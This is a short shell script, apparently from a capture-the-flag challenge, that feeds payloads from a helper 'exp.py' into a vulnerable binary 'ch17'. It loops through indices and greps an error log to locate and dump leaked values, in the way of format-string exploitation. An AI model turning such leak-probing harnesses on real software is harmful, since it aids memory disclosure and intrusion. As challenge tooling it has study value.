#!/bin/sh

exp="exp.py"
vuln="ch17"
prog_name="bin_error.log"

execute () {
    python $exp $1 | ./$vuln 
}

find_index () {
    for x in $(seq 1 350); do
        execute $x  1>/dev/null 2>&1

        grep -i "$1" "$prog_name" 1>/dev/null 2>&1

        if [ $? -eq 0 ]; then
            echo "Found at index $x"
            break
        fi
    done
}

dump () {
    for x in $(seq 1 300); do
      execute $x 2>&2 1>/dev/null
      read_file
    done
}

read_file() {
  printf $(sed 's/.*:\s*//g' $prog_name)
}

execute "2"
